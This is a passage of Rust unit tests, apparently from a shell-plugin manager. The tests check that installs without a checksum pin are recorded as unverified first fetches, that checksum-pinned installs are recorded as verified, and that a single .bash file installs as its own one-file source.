    /// false`; a pinned one records true. (Catalog origins are covered by
    /// the compiled-in table.) Wild file sources keep the ids distinct so
    /// the two installs coexist.
    #[test]
    fn first_fetch_verification_is_recorded_on_install() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("first-fetch");
        let root = temp.join("sources");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);

        let origin_a = temp.join("tree-a");
        fs::create_dir_all(&origin_a).unwrap();
        fs::write(origin_a.join("a.bash"), "a_fn() { :; }\n").unwrap();
        let unpinned = add_source(SourceInstallRequest {
            id: Some("wild-a".to_string()),
            ..local_request(&origin_a)
        })
        .unwrap();
        assert!(
            !unpinned.first_fetch_verified,
            "an unpinned non-catalog install is an unverified first fetch"
        );

        // A different tree with the pin computed first: verified.
        let origin_b = temp.join("tree-b");
        fs::create_dir_all(&origin_b).unwrap();
        fs::write(origin_b.join("b.bash"), "b_fn() { :; }\n").unwrap();
        let checksum = tree_sha256(&origin_b).unwrap();
        let pinned = add_source(SourceInstallRequest {
            id: Some("wild-b".to_string()),
            expected_checksum: Some(checksum),
            ..local_request(&origin_b)
        })
        .unwrap();
        assert!(pinned.first_fetch_verified, "{pinned:?}");
        let _ = fs::remove_dir_all(&temp);
    }

    // ── niubash#300: the bare-path positional form ──────────────────────────

    /// A single .sh/.bash FILE path snapshot-copies into its own one-file
    /// source tree (the wild file-source shape), same as a directory.
    #[test]
    fn single_file_path_installs_as_a_wild_source() {
        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let temp = unique_temp_dir("single-file");
        let origin = temp.join("myscript.bash");
        fs::write(&origin, "myscript_fn() { :; }\n").unwrap();
        let root = temp.join("sources");
        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);

        let record = add_source(SourceInstallRequest {
            id: Some("myscript".to_string()),
            ..local_request(&origin)
        })
        .expect("a single-file path must install");
        assert_eq!(record.adapter, "file", "{record:?}");
        assert_eq!(record.ref_name, LOCAL_ORIGIN_REF);
        assert!(record.path.join("myscript.bash").is_file());
        let statuses = list_sources();
        assert_eq!(statuses.len(), 1);
        assert_eq!(statuses[0].asset_count, Some(1));
        let _ = fs::remove_dir_all(&temp);
    }
}
